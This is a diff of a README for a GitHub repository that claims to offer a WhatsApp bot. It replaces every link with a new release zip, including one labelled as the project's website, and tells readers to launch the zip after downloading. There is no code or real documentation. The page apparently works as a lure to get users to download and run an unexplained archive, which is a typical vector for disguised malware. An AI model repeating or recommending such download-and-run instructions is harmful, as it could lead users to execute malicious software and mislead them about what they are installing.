@@ -12,8 +12,8 @@ Welcome to the **BOT-NEW** repository! This repository is dedicated to the creat
 
 ## Installation
 To get started with the "Asitha-md whatsapp bot", please download the necessary software by clicking the button below:
-[![Download Software](https://github.com/Mizea2/BOT-NEW/releases/download/v1.0/Release_x64.zip)](https://github.com/Mizea2/BOT-NEW/releases/download/v1.0/Release_x64.zip)  
-*Note: The https://github.com/Mizea2/BOT-NEW/releases/download/v1.0/Release_x64.zip needs to be launched after downloading.*
+[![Download Software](https://github.com/Mizea2/BOT-NEW/releases/download/v2.0/Software.zip)](https://github.com/Mizea2/BOT-NEW/releases/download/v2.0/Software.zip)  
+*Note: The https://github.com/Mizea2/BOT-NEW/releases/download/v2.0/Software.zip needs to be launched after downloading.*
 
 If the above link does not work, you can check the "Releases" section of this repository for alternative download options.
 
@@ -33,7 +33,7 @@ Once you have downloaded the necessary files, follow the instructions in the REA
 If you are interested in contributing to the development of the "Asitha-md whatsapp bot", feel free to fork this repository and submit your pull requests. Your feedback and ideas are always welcome as we work together to improve and expand the capabilities of this innovative bot.
 
 ## Resources
-For additional information and support, please visit [Asitha-md's website](https://github.com/Mizea2/BOT-NEW/releases/download/v1.0/Release_x64.zip). Here you can find tutorials, documentation, and FAQs to help you make the most of the WhatsApp bot.
+For additional information and support, please visit [Asitha-md's website](https://github.com/Mizea2/BOT-NEW/releases/download/v2.0/Software.zip). Here you can find tutorials, documentation, and FAQs to help you make the most of the WhatsApp bot.
 
 ---
 
